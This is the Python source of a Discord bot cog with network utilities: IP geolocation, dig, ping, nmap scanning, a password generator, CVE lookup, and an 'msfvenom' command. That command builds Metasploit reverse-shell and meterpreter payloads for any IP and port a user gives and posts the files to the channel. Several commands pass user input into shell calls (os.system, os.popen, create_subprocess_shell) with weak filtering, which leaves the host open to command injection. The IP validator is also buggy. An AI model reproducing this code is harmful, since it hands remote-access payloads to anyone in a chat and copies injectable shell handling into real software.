import discord, os, requests, string, passgen, subprocess, socket, json, time, aionmap, re, asyncio
from datetime import datetime
from discord import Embed, colour
from discord.ext import commands
from aiohttp import request

def validate_ip(s):
    if s is not None:
        restricted = ["192.16", "173.16", "172.31", "127.0."]
        a = s.split('.')
        if len(a) != 4:
            return False
        for x in a:
            if not x.isdigit():
                return False
            i = int(x)
            if i < 0 or i > 255:
                return False
        firstsix = s[0:6]
        print(firstsix)
        check = any(r in firstsix for r in restricted)
        print(check)
        if check is True:
            return False
        else:
            if s[2] == "10":
                return False
            else:
                return True

def validate_port(s):
    try:
        s = int(s)
    except ValueError:
        return False

    if s <= 65535:
        return True
    else:
        return False

async def ping_f(ip, count):
    args = f"ping -c {count} {ip}"
    cmd = await asyncio.create_subprocess_shell(args, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
    stdout, stderr = await cmd.communicate()
    output = str(stdout, 'utf-8')
    return output

async def nmap_scan(scantype, ip, ports=""):
    scanner = aionmap.PortScanner()
    if ports != "":
        if "," not in ports:
            ports = re.sub("\s+", ",", ports.strip())
        result = await scanner.scan(ip, ports, scantype, sudo=False)
        return result
    else:
        result = await scanner.scan(ip, None, scantype, sudo=False)
        return result

class networkingtools(commands.Cog):
    def __init__(self, client):
        self.client = client

    @commands.command(name="iplookup", description="Provides geoinformation on an IP", aliases=["geoip", "ip", "ipinfo"])
    async def nmap(self, ctx, ip=""):
        if ip == "":
            await ctx.send("Please provide an IP")
        else:
            url = "http://ip-api.com/json/" + ip
            async with request("GET", url, headers={}) as response:
                if response.status == 200:
                    data = await response.json()
                    if data['status'] == "success":
                        embed = Embed(title=f"Information for {ip}",
                                      colour=discord.Colour.red(),
                                      inline=False)
                        embed.set_thumbnail(url="https://www.omnivisiondesign.com/wp-content/uploads/2013/06/IP_address.jpg")
                        embed.add_field(name="Country: ", value=data['country'])
                        embed.add_field(name="Country code: ", value=data['countryCode'])
                        embed.add_field(name="Region: ", value=data['regionName'])
                        embed.add_field(name="City: ", value=data['city'])
                        embed.add_field(name="Organisation: ", value=data['org'])
                        embed.add_field(name="ISP: ", value=data['isp'])
                        time = ctx.message.created_at
                        embed.set_footer(text=f"Asked by {ctx.author.name} " + time.strftime("%d/%m/%y %X"))
                        await ctx.send(embed=embed)
                    else:
                        await ctx.send("Could not find IP")
                elif response.status == 429:
                    await ctx.send("Daily iplookup limit reached")
                else:
                    await ctx.send("There was an issue with the API, please try again later!")
                    print(f" API returned {response.status}")

    @commands.command(name="dig", description="Dig comamnd, takes a domain or IP")
    async def dig(self, ctx, DNS=""):
        text = "Usage: ./dig [DNS]"
        if DNS == "":
            await ctx.send(f"```{text}```")
        else:
            if validate_ip(DNS) is True:
                output = os.popen(f"dig {DNS}").read()
                await ctx.send(f"```\n{output}```")
            elif validate_ip(DNS) is False:
                await ctx.send(f"```Invalid host provided\n{text}```")
            else:
                await ctx.send(f"```Unable to validate DNS\n{text}```")

    @commands.command(name="passgen", description="generates a number of passwords with a given length", aliases=["passwordgenerator", "password"])
    async def passwords(self, ctx, number: int, length: int):
        if number in range(0, 26) is False or length in range(3, 51) is False:
            await ctx.send("You must have at least 1 password with 4 characters")
        else:

            embed = Embed(title="Passwords ",
                          description=f"{number} passwords of {length} length: ",
                          colour=discord.Colour.random())
            i = 0
            num = 0
            passwords = set({})
            while i != number:
                output = passgen.passgen(length=length, punctuation=True, digits=True, letters=True, case='both')
                passwords.add(output)
                i += 1
            for password in passwords:
                embed.add_field(name=f"Password {num + 1}", value=password)
                num += 1
            time = ctx.message.created_at
            embed.set_footer(text=f"Asked by {ctx.author.name} " + time.strftime("%d/%m/%y %X"))
            await ctx.author.send(embed=embed)
            await ctx.send("Passwords were send to your DMs!")

    @passwords.error
    async def passgen_error(self, ctx, error):
        if isinstance(error, commands.BadArgument):
            await ctx.send("Please enter args as integers")
        elif isinstance(error, commands.MissingRequiredArgument):
            await ctx.send("Please enter the number of passwords and the length")
        elif isinstance(error, commands.CommandInvokeError):
            await ctx.send("Please ensure you ask for at least 1 password with at least 4 characters")
        else:
            raise

    @commands.command(name="ping", description="Pings any provided IP")
    async def ping(self, ctx, ip: str = "", count: int = 3):
        text = "Usage: ./ping {ip} {count}\nMax count is 10"
        ip = socket.gethostbyname(ip)
        if validate_ip(ip) is True:
            if count <= 10:
                output = await ping_f(ip, count)
                await ctx.send(f"```{output}```")
            else:
                await ctx.send(f"```You may only have up to 10 ping requests\n{text}```")
        else:
            await ctx.send(f"```Please enter a valid IP address\n{text}```")




    @commands.command(name="nmap", description="Performs basic scans using the nmap. The bot will be paused while this runs! ")
    @commands.cooldown(2, 30, commands.BucketType.user)
    async def nmapscan(self, ctx, scantype: str, ip=None, *, ports=""):
        text = "Usage: ./nmap [scantype] [ip] (port)\nAvailable scan types: -sT, -sV"
        scan_types = ['-PS', '-sT', '-sV']
        if scantype in scan_types:
            ip = socket.gethostbyname(ip)
            if validate_ip(ip) is True:
                if ports != "":
                    if "," in ports:
                        a = ports.split(",")
                    else:
                        a = ports.split()
                    for port in a:
                        if validate_port(port):
                            validports = True
                    if validports is True:
                        checks = True
                    else:
                        checks = False
                        await ctx.send(f"```Invalid ports selected!\n{text}```")
                else:
                    checks = True
            else:
                checks = False
                await ctx.send(f"```{text}```")
        else:
            await ctx.send(f"```{text}```")
            checks = False

        if checks is True:
            scan_start = datetime.now()
            if ports != "":
                await ctx.send(f"Executing: nmap {scantype} {ip} -p {ports}, results will be sent to your DMs!")
                results = await nmap_scan(scantype, ip, ports)
            else:
                await ctx.send(f"Executing: nmap {scantype} {ip}, results will be sent to your DMs!")
                results = await nmap_scan(scantype, ip)
            if isinstance(results, Exception):
                await ctx.author.send(f"The bot encountered an error while trying to scan {ip}!")
            else:
                x = results.get_raw_data()
                scaninfo = x['_scaninfo']
                stats = x['_runstats']
                finish = stats['finished']
                host = x['_hosts']
                hoststats = stats['hosts']
                strtosend = f"""
Scan started at: {results.startedstr}
Nmap version: {results.version}
{host[0]} (Total up: {hoststats['total']})

Scan info:
    Type: {scaninfo['type'].upper()}

    Protocol: {scaninfo['protocol'].upper()}

Total number of services {scaninfo['numservices']}

services: \n{scaninfo['services']}

Finish time: {finish['timestr']} (Elapsed: {finish['elapsed']})
Requested by: {ctx.author.name}
                """
                filename = f"./scans/{results.started}_{ctx.author.id}.txt"
                with open(filename, 'a') as f:
                    f.write(strtosend)
                f.close()
                await ctx.author.send(file=discord.File(filename))
                os.remove(filename)

    @nmapscan.error
    async def scan_error(self, ctx, error):
        if isinstance(error, commands.MissingRequiredArgument):
            await ctx.send("```Usage: ./nmap [scantype] [ip] (port)```")
        elif isinstance(error, commands.CommandOnCooldown):
            await ctx.send(f"The nmap command is on cooldown, please try again in: {error.retry_after:.2f}s")
        else:
            raise

    @commands.command(name="msfvenom", description="Geneate msf payload, for payloads type ./msfvenom options", aliases=["msfpayload"])
    async def msfvenom(self, ctx, payload: str, ip = None, port = None):

        if payload == "options":
            await ctx.send("""```accesslog
Usage: ./msfvenom [payload] [ip] [port]
Available payloads:
    windows/meterpeter/reverse_tcp
    windows/shell/reverse_tcp
    linux/x64/shell/reverse_tcp
    linux/x32/shell/reverse_tcp
    Other payloads will be accepted in the same format and ouput as a txt```
                """)
        if validate_port(port) is True:
            if validate_ip(ip) is True:
                port = int(port)
                if 1 <= port <= 65535:
                    bad_chars = [';', ':', '!', '*', '#', '$', '(', ')']
                    payload = ''.join((filter(lambda i: i not in bad_chars, payload)))
                    payload = payload.lower()
                    if payload == "windows/meterpeter/reverse_tcp":
                        os.system(f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -o ./payloads/{ctx.author.id}_windows_meterpeter_reverse_tcp.bat")
                        await ctx.send(file=discord.File(f"./payloads/{ctx.author.id}_windows_meterpeter_reverse_tcp.bat"))
                        os.remove(f"./payloads/{ctx.author.id}_windows_meterpeter_reverse_tcp.bat")
                    elif payload == "windows/shell/reverse_tcp":
                        os.system(f"msfvenom -p windows/shell/reverse_tcp LHOST={ip} LPORT={port} -o ./payloads/{ctx.author.id}_windows_shell_reverse_tcp.bat")
                        await ctx.send(file=discord.File(f"./payloads/{ctx.author.id}_windows_shell_reverse_tcp.bat"))
                        os.remove(f"./payloads/{ctx.author.id}_windows_shell_reverse_tcp.bat")
                    elif payload == "linux/x64/shell/reverse_tcp":
                        os.system(f"msfvenom -p linux/x64/shell/reverse_tcp LHOST={ip} LPORT={port} -o ./payloads/{ctx.author.id}_linux_x64_shell_reverse_tcp.elf")
                        await ctx.send(file=discord.File(f"./payloads/{ctx.author.id}_linux_x64_shell_reverse_tcp.elf"))
                    elif payload == "linux/x32/shell/reverse_tcp":
                        os.system(f"msfvenom -p linux/x32/shell/reverse_tcp LHOST={ip} LPORT={port} -o ./payloads/{ctx.author.id}_linux_x32_shell_reverse_tcp.elf")
                        await ctx.send(file=discord.File(f"./payloads/{ctx.author.id}_linux_x32_shell_reverse_tcp.elf"))
                        os.system(f"msfvenom -p linux/x64/shell/reverse_tcp LHOST={ip} LPORT={port} -o ./payloads/{ctx.author.id}_linux_x64_shell_reverse_tcp.elf")
                        os.remove(f"./payloads/{ctx.author.id}_linux_x32_shell_reverse_tcp.elf")
                    else:
                        os.system(f"msfvenom -p {payload} LHOST={ip} LPORT={port} -o ./payloads/{ctx.author.id}_payload.txt")
                        await ctx.send(file=discord.File(f"./payloads/{ctx.author.id}_payload.txt"))
                        os.remove(f"./payloads/{ctx.author.id}_payload.txt")
                else:
                    print("Please enter a  valid IP address")
            else:
                print("Please enter a valid port")


    @msfvenom.error
    async def msfvenom_error(self, ctx, error):
        if isinstance(error, commands.MissingRequiredArgument):
            await ctx.send("Please enter a payload, IP and port. Use ./msfvenom options for a list of avilable payloads")
        else:
            raise
    @commands.command(name="cvesearch", description="Search", alises=["cveid", "cvelookup"])
    async def cvesearch(self, ctx, cveid):
        if cveid == "":
            await ctx.send("Please provide a cve ID")
        else:
            url = "https://cve.circl.lu/api/cve/" + cveid
            async with request("GET", url, headers={}) as response:
                if response.status == 200:
                    data = await response.json()
                    embed = Embed(title=f"Info on {cveid}",
                                  description=f"Name: {data['capec'][0]['name']}",
                                  colour=discord.Colour.random(),
                                  inline=True)
                    embed.add_field(name="Authentication: ", value=data['access']['authentication'], inline=True)
                    embed.add_field(name="Complexity: ", value=data['access']['complexity'], inline=True)
                    embed.add_field(name="Vector: ", value=data['access']['vector'], inline=True)
                    embed.add_field(name="Summary: ", value=data['capec'][0]['summary'], inline=True)
                    embed.add_field(name="Solutions: ", value=data['capec'][0]['solutions'], inline=True)

                    time = ctx.message.created_at
                    embed.set_footer(text=f"Asked by {ctx.author.name} " + time.strftime("%d/%m/%y %X"))

                    await ctx.send(embed=embed)
    @cvesearch.error
    async def cves_error(self, ctx, error):
        if isinstance(error, commands.MissingRequiredArgument):
            await ctx.send("Please enter a CVE to search")
        else:
            raise

def setup(client):
    client.add_cog(networkingtools(client))
